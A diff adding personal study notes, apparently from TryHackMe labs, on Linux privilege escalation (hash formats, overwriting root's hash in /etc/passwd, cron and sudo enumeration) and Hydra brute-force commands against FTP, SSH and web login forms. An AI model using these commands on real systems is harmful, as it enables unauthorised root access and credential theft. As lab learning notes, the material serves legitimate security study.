@@ -256,4 +256,39 @@ weaknesses in system, main purpose to eat system resources and slow down system,
 executes through a program and interprets as utility software, main purpose to steal info, spreads at slow rate
 
 
+Linux Privilege Escalation:[THM Room]
+-can be vertical(form user to root or administrator) or horizontal(b/w diff users)
+format of the password is $id$salt$hash
+$1$: MD5
+$2$: Blowfish
+$3$: Blowfish
+$5$: SHA256
+$6$: SHA512
+
+hashid hash.txt   //tells you which kind of encryption like sha-512 etc..
+gzip -d rockyou.txt.gz
+mkpasswd -m sha-512 newpasswordhere
+su root
+Generate a new password hash with a password of your choice:
+
+openssl passwd newpasswordhere
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+Switch to the root user, using the new password:
+su root
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the
+configuration for cron jobs
+sudo -l  //to see which all programs can be executed by a user
+cat /etc/crontab
+locate overwrite.sh
+
+..to be contd..:( free trial of machine expired off 
+
+
+Hydra:
+Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool
+hydra -l user -P passlist.txt ftp://MACHINE_IP  //The options we pass into Hydra depends on which service (protocol) we're attacking.
+For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt
+hydra -l <username> -P <full path to pass> 10.10.136.229 -t 4 ssh    //-l username -P passwd -t no of threads to use
+hydra -l <username> -P <wordlist> 10.10.136.229 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
